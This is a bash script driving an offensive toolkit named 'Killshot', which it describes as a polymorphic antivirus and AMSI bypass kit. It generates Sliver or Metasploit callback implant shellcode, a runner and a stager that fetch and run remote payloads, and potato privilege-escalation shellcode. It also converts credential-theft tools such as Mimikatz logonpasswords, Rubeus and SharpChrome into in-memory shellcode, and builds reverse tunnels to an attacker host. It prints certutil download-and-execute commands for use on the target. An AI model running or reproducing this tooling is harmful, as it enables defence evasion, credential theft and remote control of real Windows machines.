#!/bin/bash
# =============================================================
# Killshot - Polymorphic AV/AMSI Bypass Toolkit
# =============================================================

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# ─── Banner ──────────────────────────────────────────────────

show_banner() {
    cat << 'BANNER'

    ▄█   ▄█▄  ▄█   ▄█        ▄█          ▄████████    ▄█    █▄     ▄██████▄      ███
   ███ ▄███▀ ███  ███       ███         ███    ███   ███    ███   ███    ███ ▀█████████▄
   ███▐██▀   ███▌ ███       ███         ███    █▀    ███    ███   ███    ███    ▀███▀▀██
  ▄█████▀    ███▌ ███       ███         ███         ▄███▄▄▄▄███▄▄ ███    ███     ███   ▀
 ▀▀█████▄   ███▌ ███       ███       ▀███████████ ▀▀███▀▀▀▀███▀  ███    ███     ███
   ███▐██▄  ███  ███       ███                ███   ███    ███   ███    ███     ███
   ███ ▀███▄███  ███▌    ▄ ███▌    ▄    ▄█    ███   ███    ███   ███    ███     ███
   ███   ▀█████  █████▄▄██ █████▄▄██  ▄████████▀    ███    █▀     ▀██████▀    ▄████▀

BANNER
}

show_help() {
    show_banner
    echo "  Polymorphic AV/AMSI bypass toolkit"
    echo "  Converts any PE/.NET tool to in-memory shellcode via Donut + runner.exe"
    echo ""
    echo "  COMMANDS"
    echo "    killshot generate [flags] [opts]  Generate specific components (or --all)"
    echo "    killshot tool <name> [opts]       Convert a single tool to shellcode"
    echo "    killshot list                     List available tools and status"
    echo "    killshot check                    Verify toolkit installation"
    echo "    killshot serve                    Start HTTP server for workspace"
    echo "    killshot help                     Show this help"
    echo ""
    echo "  GENERATE FLAGS (mix and match)"
    echo "    --all, -a              Generate everything (full pipeline)"
    echo "    --implant              C2 implant shellcode (Sliver/MSF)"
    echo "    --runner               Polymorphic runner.exe"
    echo "    --stager               PowerShell stager with AMSI bypass"
    echo "    --potato <name>        Single potato (GodPotato, PrintSpoofer, BadPotato, EfsPotato)"
    echo "    --potatoes             All potato exploits"
    echo "    --tool <name>          Single tool to shellcode (see killshot list)"
    echo "    --tools                All offensive tools to shellcode"
    echo "    --loaders              PowerShell tool loaders (Rubeus/Mimikatz fallback)"
    echo ""
    echo "  GENERATE OPTIONS"
    echo "    -l, --lhost IP         Listener/callback IP         (default: 10.99.0.16)"
    echo "    -p, --lport PORT       C2 listener port             (default: 4444)"
    echo "    -h, --http PORT        HTTP file server port        (default: 8000)"
    echo "    -f, --framework NAME   sliver | msf                 (default: sliver)"
    echo "    -t, --type TYPE        beacon | session (sliver)    (default: beacon)"
    echo "    -c, --cmd CMD          Custom command for potatoes"
    echo "    --params PARAMS        Custom params for --tool"
    echo "    -o, --output PATH      Output path for --tool/--potato"
    echo ""
    echo "  TOOL OPTIONS"
    echo "    killshot tool <name> [-p params] [-o output]"
    echo ""
    echo "  EXAMPLES"
    echo "    killshot generate -l 10.10.14.5 --all            # Full pipeline"
    echo "    killshot generate -l 10.10.14.5 --runner         # Just runner.exe"
    echo "    killshot generate -l 10.10.14.5 --implant        # Just C2 implant"
    echo "    killshot generate -l 10.10.14.5 --stager         # Just stager.ps1"
    echo "    killshot generate -l 10.10.14.5 --runner --stager  # Runner + stager"
    echo "    killshot generate --potato GodPotato             # Single potato"
    echo "    killshot generate --potatoes -l 10.10.14.5       # All potatoes"
    echo "    killshot generate --tool Certify                 # Single tool"
    echo "    killshot generate --tool Certify --params 'cas'  # Tool with custom params"
    echo "    killshot generate --tools -l 10.10.14.5          # All tools"
    echo "    killshot generate -l 10.10.14.5 -f msf --all     # Full pipeline (MSF)"
    echo "    killshot list                                    # Show tools"
    echo "    killshot check                                   # Verify install"
    echo "    killshot serve                                   # HTTP server"
    echo ""
    echo "  ON TARGET"
    echo "    certutil -urlcache -split -f http://LHOST:PORT/runner.exe %TEMP%\\r.exe"
    echo "    %TEMP%\\r.exe -remote http://LHOST:PORT/implant.enc"
    echo "    %TEMP%\\r.exe -remote http://LHOST:PORT/rubeus.enc"
    echo "    %TEMP%\\r.exe -remote http://LHOST:PORT/mimikatz.enc"
    echo "    %TEMP%\\r.exe -remote http://LHOST:PORT/seatbelt.enc"
    echo "    %TEMP%\\r.exe -remote http://LHOST:PORT/godpotato.enc"
    echo "    (any .enc file works — see 'killshot list')"
    echo ""
}

# ─── Subcommand dispatch ─────────────────────────────────────

# Resolve SCRIPT_DIR for finding companion scripts
# (handles symlink from /usr/local/bin/killshot)
if [ -L "$0" ]; then
    REAL_PATH="$(readlink -f "$0")"
    SCRIPT_DIR="$(cd "$(dirname "$REAL_PATH")" && pwd)"
fi

# ─── Detect platform ─────────────────────────────────────────

PLATFORM="linux"
if [ -d "/.exegol" ] || [ -f "/opt/.exegol_version" ] || echo "${HOSTNAME:-}" | grep -q "^exegol-"; then
    PLATFORM="exegol"
elif grep -qi "kali" /etc/os-release 2>/dev/null; then
    PLATFORM="kali"
fi

# Auto-detect workspace and Go path based on platform
if [ "$PLATFORM" = "exegol" ]; then
    WORKSPACE="${WORKSPACE:-/workspace}"
    for gp in "$SCRIPT_DIR/go/bin" "/opt/my-resources/bin/go/bin"; do
        [ -f "$gp/go" ] && export PATH="$gp:$PATH" && break
    done
else
    WORKSPACE="${WORKSPACE:-/opt/killshot/output}"
    mkdir -p "$WORKSPACE" 2>/dev/null || sudo mkdir -p "$WORKSPACE" 2>/dev/null && sudo chown "$(id -u):$(id -g)" "$WORKSPACE" 2>/dev/null || true
    for gp in "$SCRIPT_DIR/go/bin" "/opt/killshot/go/bin" "/usr/local/go/bin"; do
        [ -f "$gp/go" ] && export PATH="$gp:$PATH" && break
    done
fi

MODE=""
case "${1:-}" in
    generate|gen)
        MODE="generate"; shift;;
    tool)
        MODE="tool"; shift;;
    list|ls)
        MODE="list"; shift;;
    all)
        MODE="generate"; shift; set -- --all "$@";;
    check|status)
        MODE="check"; shift;;
    serve|http)
        MODE="serve"; shift;;
    help|--help|-help|-h)
        show_help; exit 0;;
    --list)
        MODE="list"; shift;;
    --check|--status)
        MODE="check"; shift;;
    --all)
        MODE="generate";;
    --tool)
        MODE="tool"; shift;;
    --serve)
        MODE="serve"; shift;;
    "")
        show_help; exit 0;;
    -*)
        # Flags without subcommand = generate mode (backwards compat)
        MODE="generate";;
    *)
        # Unknown first arg — could be positional LHOST for generate
        MODE="generate";;
esac

# ─── Mode: list ──────────────────────────────────────────────

if [ "$MODE" = "list" ]; then
    show_banner
    python3 "$SCRIPT_DIR/killshot.py" --list -s "$SCRIPT_DIR"
    exit $?
fi

# ─── Mode: check ─────────────────────────────────────────────

if [ "$MODE" = "check" ]; then
    exec "$SCRIPT_DIR/install.sh" --check
fi

# ─── Mode: tool ──────────────────────────────────────────────

if [ "$MODE" = "tool" ]; then
    TOOL_NAME="$1"
    if [ -z "$TOOL_NAME" ]; then
        echo "Usage: killshot tool <name> [-p params] [-o output.enc]"
        echo ""
        python3 "$SCRIPT_DIR/killshot.py" --list -s "$SCRIPT_DIR"
        exit 1
    fi
    shift
    # Pass remaining args through to killshot.py
    exec python3 "$SCRIPT_DIR/killshot.py" --tool "$TOOL_NAME" -s "$SCRIPT_DIR" "$@"
fi

# ─── Mode: serve ──────────────────────────────────────────────

if [ "$MODE" = "serve" ]; then
    PORT="${1:-8000}"
    echo "[*] Serving $WORKSPACE on port $PORT"
    echo "[*] Ctrl+C to stop"
    cd "$WORKSPACE" && exec python3 -m http.server "$PORT"
fi

# ─── Mode: generate ──────────────────────────────────────────

LHOST="10.99.0.16"
LPORT="4444"
HTTP_PORT="8000"
FRAMEWORK="sliver"
IMPLANT_TYPE="beacon"
POTATO_CMD_OVERRIDE=""
TOOL_PARAMS_OVERRIDE=""
OUTPUT_OVERRIDE=""
SINGLE_POTATO=""
SINGLE_TOOL=""

# Component flags (0 = skip, 1 = generate)
GEN_ALL=0
GEN_IMPLANT=0
GEN_RUNNER=0
GEN_STAGER=0
GEN_POTATOES=0
GEN_TOOLS=0
GEN_LOADERS=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        -a|--all)       GEN_ALL=1; shift;;
        --implant)      GEN_IMPLANT=1; shift;;
        --runner)       GEN_RUNNER=1; shift;;
        --stager)       GEN_STAGER=1; shift;;
        --potatoes)     GEN_POTATOES=1; shift;;
        --potato)       GEN_POTATOES=1; SINGLE_POTATO="$2"; shift 2;;
        --tools)        GEN_TOOLS=1; shift;;
        --tool)         GEN_TOOLS=1; SINGLE_TOOL="$2"; shift 2;;
        --loaders)      GEN_LOADERS=1; shift;;
        -l|--lhost)     LHOST="$2"; shift 2;;
        -p|--lport)     LPORT="$2"; shift 2;;
        -h|--http)      HTTP_PORT="$2"; shift 2;;
        -f|--framework) FRAMEWORK="$2"; shift 2;;
        -t|--type)      IMPLANT_TYPE="$2"; shift 2;;
        -c|--cmd)       POTATO_CMD_OVERRIDE="$2"; shift 2;;
        --params)       TOOL_PARAMS_OVERRIDE="$2"; shift 2;;
        -o|--output)    OUTPUT_OVERRIDE="$2"; shift 2;;
        --help)         show_help; exit 0;;
        *)
            if [ -z "${POS_SET:-}" ]; then
                LHOST="$1"; POS_SET=1
            elif [ "$POS_SET" = "1" ]; then
                LPORT="$1"; POS_SET=2
            elif [ "$POS_SET" = "2" ]; then
                HTTP_PORT="$1"; POS_SET=3
            fi
            shift;;
    esac
done

# If --all, enable everything
if [ "$GEN_ALL" = "1" ]; then
    GEN_IMPLANT=1; GEN_RUNNER=1; GEN_STAGER=1
    GEN_POTATOES=1; GEN_TOOLS=1; GEN_LOADERS=1
fi

# If no component flags given, show help
if [ "$GEN_IMPLANT$GEN_RUNNER$GEN_STAGER$GEN_POTATOES$GEN_TOOLS$GEN_LOADERS" = "000000" ]; then
    echo "[!] No component flags specified. Use --all for everything, or pick components:"
    echo ""
    echo "    killshot generate -l $LHOST --all         # Everything"
    echo "    killshot generate -l $LHOST --runner      # Just runner.exe"
    echo "    killshot generate -l $LHOST --implant     # Just C2 implant"
    echo "    killshot generate --potato GodPotato      # Single potato"
    echo "    killshot generate --tool Certify          # Single tool"
    echo ""
    echo "    See: killshot help"
    exit 1
fi

show_banner
echo "[*] Platform: $PLATFORM | Framework: $FRAMEWORK | LHOST=$LHOST LPORT=$LPORT HTTP=$HTTP_PORT"
echo "[*] Workspace: $WORKSPACE"
echo "[*] Go: $(go version 2>/dev/null || echo 'NOT FOUND — run install.sh')"

# Find Donut (needed by potatoes, tools, and loaders)
DONUT_PY=""
for p in "/opt/tools/Empire/venv/bin/python3" \
         "$(which python3 2>/dev/null)"; do
    [ -f "$p" ] && "$p" -c "import donut" 2>/dev/null && DONUT_PY="$p" && break
done

GENERATED=()

# ─── Implant ─────────────────────────────────────────────────

if [ "$GEN_IMPLANT" = "1" ]; then
    echo ""
    echo "[*] Generating $FRAMEWORK implant shellcode..."

    if [ "$FRAMEWORK" = "sliver" ]; then
        # Find sliver binaries — prefer client (connects to running daemon)
        SLIVER_CLIENT=$(which sliver-client 2>/dev/null || echo "/opt/tools/bin/sliver-client")
        SLIVER_SERVER=$(which sliver-server 2>/dev/null || echo "/opt/tools/bin/sliver-server")

        if [ -x "$SLIVER_CLIENT" ] || [ -x "$SLIVER_SERVER" ]; then
            rm -f /tmp/implant.bin

            if [ "$IMPLANT_TYPE" = "session" ]; then
                GEN_CMD="generate --mtls ${LHOST}:${LPORT} --os windows --arch amd64 --format shellcode --save /tmp/implant.bin --skip-symbols --shellcode-encoder none"
            else
                GEN_CMD="generate beacon --mtls ${LHOST}:${LPORT} --os windows --arch amd64 --format shellcode --save /tmp/implant.bin --skip-symbols --shellcode-encoder none"
            fi

            echo "$GEN_CMD" > /tmp/sliver_gen.rc
            echo "exit" >> /tmp/sliver_gen.rc
            echo "[*] This may take a minute (Sliver is compiling)..."

            # Try sliver-client first (connects to running daemon), fall back to sliver-server
            if [ -x "$SLIVER_CLIENT" ]; then
                script -qec "timeout 180 $SLIVER_CLIENT console --rc /tmp/sliver_gen.rc" /dev/null 2>&1 | grep -E "Generating|Saved|Build|Compil|symbol|implant" || true
            elif [ -x "$SLIVER_SERVER" ]; then
                script -qec "timeout 180 $SLIVER_SERVER --rc /tmp/sliver_gen.rc" /dev/null 2>&1 | grep -E "Generating|Saved|Build|Compil|symbol|implant" || true
            fi

            if [ -f /tmp/implant.bin ]; then
                base64 -w0 /tmp/implant.bin > "$WORKSPACE/implant.enc"
                echo "[+] Sliver $IMPLANT_TYPE shellcode generated"
                rm -f /tmp/implant.bin
                GENERATED+=("implant.enc")
            else
                echo "[!] Sliver generation failed"
                [ ! -f "$WORKSPACE/implant.enc" ] && exit 1
                echo "[*] Using existing implant.enc"
            fi
        else
            echo "[!] sliver-server/sliver-client not found"
            [ ! -f "$WORKSPACE/implant.enc" ] && exit 1
            echo "[*] Using existing implant.enc"
        fi

    elif [ "$FRAMEWORK" = "msf" ]; then
        MSFVENOM=$(which msfvenom 2>/dev/null || echo "/opt/tools/metasploit-framework/msfvenom")

        if [ -x "$MSFVENOM" ]; then
            echo "[*] Generating Metasploit staged reverse_https shellcode..."
            "$MSFVENOM" \
                -p windows/x64/meterpreter_reverse_https \
                LHOST="$LHOST" LPORT="$LPORT" \
                EXITFUNC=thread \
                -f raw \
                --encrypt xor \
                --encrypt-key "$(head -c 16 /dev/urandom | xxd -p)" \
                -o /tmp/implant.bin 2>&1 | grep -E "Payload|Final|Saved" || true

            if [ -f /tmp/implant.bin ]; then
                base64 -w0 /tmp/implant.bin > "$WORKSPACE/implant.enc"
                echo "[+] Metasploit shellcode generated (encrypted)"
                rm -f /tmp/implant.bin
                GENERATED+=("implant.enc")
            else
                echo "[*] Retrying without encryption..."
                "$MSFVENOM" \
                    -p windows/x64/meterpreter_reverse_https \
                    LHOST="$LHOST" LPORT="$LPORT" \
                    EXITFUNC=thread \
                    -f raw \
                    -o /tmp/implant.bin 2>&1 | grep -E "Payload|Final|Saved" || true

                if [ -f /tmp/implant.bin ]; then
                    base64 -w0 /tmp/implant.bin > "$WORKSPACE/implant.enc"
                    echo "[+] Metasploit shellcode generated (raw)"
                    rm -f /tmp/implant.bin
                    GENERATED+=("implant.enc")
                else
                    echo "[!] msfvenom failed"
                    [ ! -f "$WORKSPACE/implant.enc" ] && exit 1
                    echo "[*] Using existing implant.enc"
                fi
            fi
        else
            echo "[!] msfvenom not found"
            [ ! -f "$WORKSPACE/implant.enc" ] && exit 1
            echo "[*] Using existing implant.enc"
        fi
    else
        echo "[!] Unknown framework: $FRAMEWORK (use 'sliver' or 'msf')"
        exit 1
    fi
fi

# ─── Runner ──────────────────────────────────────────────────

if [ "$GEN_RUNNER" = "1" ]; then
    echo ""
    echo "[*] Generating polymorphic runner..."
    cd "$SCRIPT_DIR"
    RUNNER_OUT="${OUTPUT_OVERRIDE:-$WORKSPACE/runner.exe}"
    # Only use OUTPUT_OVERRIDE for runner if no other components requested
    [ "$GEN_ALL" = "1" ] && RUNNER_OUT="$WORKSPACE/runner.exe"
    python3 gen_runner.py -o "$RUNNER_OUT" -s "$SCRIPT_DIR"
    GENERATED+=("$(basename "$RUNNER_OUT")")
fi

# ─── Stager ──────────────────────────────────────────────────

if [ "$GEN_STAGER" = "1" ]; then
    echo ""
    echo "[*] Generating polymorphic stager..."
    cd "$SCRIPT_DIR"
    STAGER_OUT="${OUTPUT_OVERRIDE:-$WORKSPACE/stager.ps1}"
    [ "$GEN_ALL" = "1" ] && STAGER_OUT="$WORKSPACE/stager.ps1"
    python3 gen_stager.py \
        --runner-url "http://$LHOST:$HTTP_PORT/runner.exe" \
        --implant-url "http://$LHOST:$HTTP_PORT/implant.enc" \
        -o "$STAGER_OUT"
    GENERATED+=("$(basename "$STAGER_OUT")")
fi

# ─── Potatoes ────────────────────────────────────────────────

if [ "$GEN_POTATOES" = "1" ]; then
    echo ""
    if [ -z "$DONUT_PY" ]; then
        echo "[!] Donut not found — cannot generate potato shellcode"
    else
        POTATO_CMD="${POTATO_CMD_OVERRIDE:-cmd /c certutil -urlcache -split -f http://$LHOST:$HTTP_PORT/runner.exe %TEMP%\\r.exe && %TEMP%\\r.exe -remote http://$LHOST:$HTTP_PORT/implant.enc}"

        if [ -n "$SINGLE_POTATO" ]; then
            echo "[*] Generating $SINGLE_POTATO shellcode..."
            POTATO_LOWER=$(echo "$SINGLE_POTATO" | tr 'A-Z' 'a-z')
            POTATO_OUT="${OUTPUT_OVERRIDE:-$WORKSPACE/${POTATO_LOWER}.enc}"
            python3 "$SCRIPT_DIR/gen_potato.py" \
                -p "$SINGLE_POTATO" \
                -c "$POTATO_CMD" \
                -o "$POTATO_OUT" \
                -s "$SCRIPT_DIR"
            GENERATED+=("$(basename "$POTATO_OUT")")
        else
            echo "[*] Generating all potato shellcode..."
            for POTATO in GodPotato PrintSpoofer BadPotato EfsPotato; do
                POTATO_LOWER=$(echo "$POTATO" | tr 'A-Z' 'a-z')
                python3 "$SCRIPT_DIR/gen_potato.py" \
                    -p "$POTATO" \
                    -c "$POTATO_CMD" \
                    -o "$WORKSPACE/${POTATO_LOWER}.enc" \
                    -s "$SCRIPT_DIR" 2>&1 | grep -E "^\[" || true
                GENERATED+=("${POTATO_LOWER}.enc")
            done
        fi
    fi
fi

# ─── Tools ───────────────────────────────────────────────────

if [ "$GEN_TOOLS" = "1" ]; then
    echo ""
    if [ -z "$DONUT_PY" ]; then
        echo "[!] Donut not found — cannot generate tool shellcode"
    elif [ -n "$SINGLE_TOOL" ]; then
        echo "[*] Generating $SINGLE_TOOL shellcode..."
        TOOL_LOWER=$(echo "$SINGLE_TOOL" | tr 'A-Z' 'a-z' | tr '-' '_')
        TOOL_OUT="${OUTPUT_OVERRIDE:-$WORKSPACE/${TOOL_LOWER}.enc}"

        TOOL_ARGS=""
        if [ -n "$TOOL_PARAMS_OVERRIDE" ]; then
            TOOL_ARGS="--params $TOOL_PARAMS_OVERRIDE"
        fi

        # Handle ligolo-agent connect-back
        EXTRA_ARGS=""
        if [ "$SINGLE_TOOL" = "ligolo-agent" ] && [ -z "$TOOL_PARAMS_OVERRIDE" ]; then
            EXTRA_ARGS="--lhost $LHOST --ligolo-port 11601"
        fi

        python3 "$SCRIPT_DIR/killshot.py" \
            --tool "$SINGLE_TOOL" \
            $TOOL_ARGS $EXTRA_ARGS \
            -o "$TOOL_OUT" \
            -s "$SCRIPT_DIR"
        GENERATED+=("$(basename "$TOOL_OUT")")
    else
        echo "[*] Generating all offensive tool shellcode..."
        cd "$SCRIPT_DIR"

        declare -A TOOL_PARAMS=(
            ["Rubeus"]="triage"
            ["SharpHound"]="-c All --memcache"
            ["Certify"]="find /vulnerable"
            ["Seatbelt"]="-group=all -full"
            ["SharpDPAPI"]="triage"
            ["SharpUp"]="audit"
            ["SharpChrome"]="logins"
            ["winPEAS"]="quiet"
            ["Whisker"]="list"
            ["KrbRelayUp"]="relay"
        )

        for TOOL in Rubeus SharpHound Certify Seatbelt SharpDPAPI SharpUp SharpChrome winPEAS Whisker KrbRelayUp; do
            TOOL_LOWER=$(echo "$TOOL" | tr 'A-Z' 'a-z')
            PARAMS="${TOOL_PARAMS[$TOOL]}"
            python3 killshot.py \
                --tool "$TOOL" \
                --params "$PARAMS" \
                -o "$WORKSPACE/${TOOL_LOWER}.enc" \
                -s "$SCRIPT_DIR" 2>&1 | grep -E "^\[" || true
            GENERATED+=("${TOOL_LOWER}.enc")
        done

        # Ligolo agent
        python3 killshot.py \
            --tool ligolo-agent \
            --lhost "$LHOST" \
            --ligolo-port 11601 \
            -o "$WORKSPACE/ligolo.enc" \
            -s "$SCRIPT_DIR" 2>&1 | grep -E "^\[" || true
        GENERATED+=("ligolo.enc")

        # Chisel
        python3 killshot.py \
            --tool chisel \
            --params "client $LHOST:8443 R:socks" \
            -o "$WORKSPACE/chisel.enc" \
            -s "$SCRIPT_DIR" 2>&1 | grep -E "^\[" || true
        GENERATED+=("chisel.enc")
    fi
fi

# ─── Loaders (PS fallback) ───────────────────────────────────

if [ "$GEN_LOADERS" = "1" ]; then
    echo ""
    echo "[*] Generating PowerShell tool loaders..."
    cd "$SCRIPT_DIR"

    [ -n "$DONUT_PY" ] && echo "[+] Donut available" || echo "[!] Donut not found"

    # Rubeus
    RUBEUS_SRC=""
    for p in "$SCRIPT_DIR/tools/windows/Rubeus.exe" \
             "/opt/killshot/tools/windows/Rubeus.exe" \
             "/opt/my-resources/avbypass/tools/windows/Rubeus.exe" \
             "/opt/my-resources/setup/sliver/.sliver-client/aliases/rubeus/Rubeus.exe"; do
        [ -f "$p" ] && RUBEUS_SRC="$p" && break
    done

    if [ -n "$RUBEUS_SRC" ] && [ -n "$DONUT_PY" ]; then
        cp "$RUBEUS_SRC" "$WORKSPACE/Rubeus.exe"
        echo "[*] Converting Rubeus.exe to shellcode via Donut..."
        "$DONUT_PY" -c "
import donut
sc = donut.create(file='$RUBEUS_SRC', arch=2, params='triage', exit_opt=2)
with open('/tmp/rubeus_donut.bin','wb') as f: f.write(sc)
print(f'[+] Donut shellcode: {len(sc)} bytes')
" 2>&1
        base64 -w0 /tmp/rubeus_donut.bin > "$WORKSPACE/rubeus.enc"
        rm -f /tmp/rubeus_donut.bin
        echo "[+] rubeus.enc generated"
        GENERATED+=("rubeus.enc")
    elif [ -n "$RUBEUS_SRC" ]; then
        cp "$RUBEUS_SRC" "$WORKSPACE/Rubeus.exe"
        python3 gen_tool_stager.py \
            --tool-url "http://$LHOST:$HTTP_PORT/Rubeus.exe" \
            --tool-name Rubeus \
            --mode dotnet \
            -o "$WORKSPACE/rubeus.ps1"
        GENERATED+=("rubeus.ps1")
    fi

    # Mimikatz
    MIMI_SRC=""
    for p in "$SCRIPT_DIR/tools/windows/mimikatz.exe" \
             "/opt/killshot/tools/windows/mimikatz.exe" \
             "/opt/my-resources/avbypass/tools/windows/mimikatz.exe"; do
        [ -f "$p" ] && MIMI_SRC="$p" && break
    done

    if [ -n "$MIMI_SRC" ] && [ -n "$DONUT_PY" ]; then
        echo "[*] Converting mimikatz.exe to shellcode via Donut..."
        "$DONUT_PY" -c "
import donut
sc = donut.create(file='$MIMI_SRC', arch=2, params='privilege::debug sekurlsa::logonpasswords exit', exit_opt=2)
with open('/tmp/mimi_donut.bin','wb') as f: f.write(sc)
print(f'[+] Donut shellcode: {len(sc)} bytes')
" 2>&1
        base64 -w0 /tmp/mimi_donut.bin > "$WORKSPACE/mimikatz.enc"
        rm -f /tmp/mimi_donut.bin
        echo "[+] mimikatz.enc generated"
        GENERATED+=("mimikatz.enc")
    elif [ -n "$MIMI_SRC" ]; then
        for p in "/opt/tools/Empire/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1" \
                 "$SCRIPT_DIR/tools/windows/Invoke-Mimikatz.ps1"; do
            if [ -f "$p" ]; then
                cp "$p" "$WORKSPACE/Invoke-Mimikatz.ps1"
                python3 gen_tool_stager.py \
                    --tool-url "http://$LHOST:$HTTP_PORT/Invoke-Mimikatz.ps1" \
                    --tool-name Mimikatz \
                    --mode script \
                    -o "$WORKSPACE/mimikatz.ps1"
                GENERATED+=("mimikatz.ps1")
                break
            fi
        done
    fi
fi

# ─── Summary ─────────────────────────────────────────────────
echo ""
echo "============================================"
echo "[+] Generation complete!"
echo "============================================"
if [ ${#GENERATED[@]} -gt 0 ]; then
    for f in "${GENERATED[@]}"; do
        echo "  [+] $f"
    done
else
    echo "  (no files generated)"
fi
echo ""
echo "[*] Serve: cd $WORKSPACE && python3 -m http.server $HTTP_PORT"
echo "[*] On target: %TEMP%\\r.exe -remote http://$LHOST:$HTTP_PORT/<file>.enc"
echo "============================================"
